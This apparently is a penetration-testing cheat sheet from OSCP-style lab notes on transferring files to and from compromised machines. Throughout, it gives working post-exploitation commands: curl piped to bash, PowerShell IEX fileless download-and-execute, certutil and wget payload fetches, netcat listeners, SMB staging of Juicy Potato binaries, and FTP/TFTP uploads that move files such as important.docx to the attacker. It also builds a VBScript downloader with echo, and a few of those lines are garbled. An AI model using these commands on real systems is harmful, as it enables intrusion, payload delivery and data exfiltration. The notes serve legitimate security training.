# File Transferring

<u>**Using Netcat:**</u>

```bash
#Netcat from Windows to Linux:
#On linux:  
sudo nc -lp 1234 > (file name you want it to be on local machine)
#On windows: 
nc -w 3 (linux ip) 1234 < (file you want to xfer)

#Netcat from Linux to Windows:
#On windows: 
nc.exe -nlvp 4455 > %TEMP%\root.exe
#On linux: 
nc -w 3 192.168.236.10 4455 < evil.ps1
```

<u>**Hosting wget and curl:**</u>

```bash
#python host over port 80
sudo python3 -m http.server 80
#on victim
wget -P /tmp http://$my-ip/root.elf 

#curl
curl http://some.url -o some.file

#curl'ing without saving to disk
curl $my-ip/linpeas.sh | bash
```

<u>**Windows:**</u>

```bash
certutil.exe -urlcache -split -f http://$my-ip/root.exe %TEMP%\root.exe
```

Using Powershell:

```bash
#download
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe') 

#execute without saving to disk
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
```

Using Samba:

```bash
# on kali, host binaries:
sudo impacket-smbserver my-server .
# on kali, start a new listener
nc -nvlp 7777
# on target, download binaries from kali
robocopy \\192.168.119.131\my-server\ %TEMP% Juicy.Potato.x86.exe /copy:DT /w:1 /r:1 /v
robocopy \\192.168.119.131\my-server\ %TEMP% bubba.root.exe /copy:DT /w:1 /r:1 /v
```



**<u>FTP Oneliner:</u>**

```bash
echo open 192.168.119.236>ftp_commands.txt&echo offsec>>ftp_commands.txt&echo lab>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo put system>>ftp_commands.txt&echo bye>>ftp_commands.txt&ftp -s:ftp_commands.txt
```

**<u>TFTP:</u>**

```bash
sudo apt update && sudo apt install atftp 
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp 
```

On the Windows system, we will run the **tftp** client with **-i** to specify a binary image transfer, the IP address of our Kali system, the **put** command to initiate an upload, and finally the filename of the file to upload. 

```bash
#on windows
tftp -i $my-ip put important.docx
```

<u>**VBScript:**</u>

Using Vbscript on (in Windows XP, 2003) and PowerShell (in Windows 7, 2008, and above) :
set of non-interactive echo commands, when pasted into a remote shell, will write out a wget.vbs script that acts as a simple HTTP downloader: 

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wge t.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget. vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs echo Next >> wget.vbs
echo ts.Close >> wget.vbs 
```

We can run this (with cscript) to download files from our Kali machine: 

```bash
C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe 
```

**<u>Using UPX:</u>**

```bash
upx -9 nc.exe
exe2hex -x nc.exe -p nc.cmd
cat nc.cmd

#copy and paste contents into windows cmd
```

<u>**Linux:**</u>

```bash
base64 [filename]

#copy and paste the file into kali
vi file

#then decode it
base64 -d file > [filename.extension (if there is one)]
```